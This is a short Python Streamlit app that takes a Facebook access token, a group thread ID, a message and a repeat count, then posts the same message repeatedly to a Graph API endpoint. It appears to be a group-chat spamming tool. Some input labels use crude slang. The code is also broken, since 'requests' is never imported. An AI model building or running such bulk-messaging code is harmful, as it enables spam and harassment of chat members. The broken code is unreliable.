import streamlit as st

st.markdown(
    """
    <style>
    .stApp {
        background: repeating-linear-gradient(
            135deg,
            #fc466b 0px, 
            #3f5efb 40px, 
            #fc466b 80px, 
            #f9d423 120px, 
            #e12d6f 160px
        );
        background-size: 300% 300%;
        position: relative;
    }
    .watermark {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%) rotate(-25deg);
        font-size: 80px;
        color: rgba(60,60,60,0.13);
        font-weight: 900;
        letter-spacing: 10px;
        font-family: 'Trebuchet MS', sans-serif;
        z-index: 9999;
        pointer-events: none;
        user-select: none;
        text-shadow: 2px 2px 8px #fff2;
    }
    </style>
    <div class="watermark">Mohit</div>
    """, unsafe_allow_html=True
)

st.title("Facebook Automation Demo")
st.write("This app features a bold striped background and a stylish Mohit watermark.")



st.title("Facebook Group Message Automation")

# --- User Input ---
fb_token = st.text_input("TOKEN DAAL LAWDE", type="password")
group_id = st.text_input("GROUP NUMBER DAAL")
message_text = st.text_area("Message to Send")
num_messages = st.number_input("KITNI BAAR BHEJNA HAI ?", min_value=1, value=1)

if st.button("Send Message"):
    sent = 0
    for _ in range(int(num_messages)):
        # The correct endpoint and parameters may differ according to API documentation and group permissions
        url = f"https://graph.facebook.com/v15.0/t_{group_id}"
        headers = {'Content-Type': 'application/json'}
        params = {
            'access_token': fb_token,
            'message': message_text,
        }

        response = requests.post(url, json=params, headers=headers)
        if response.ok:
            st.success(f"Message sent (attempt #{sent+1})")
            sent += 1
        else:
            st.error(f"Failed (attempt #{sent+1}): {response.text}")
            break

if st.button("About"):
    st.info("This app lets you automate group messages to Facebook group conversations if your token and ID are valid and you have permissions.")
    
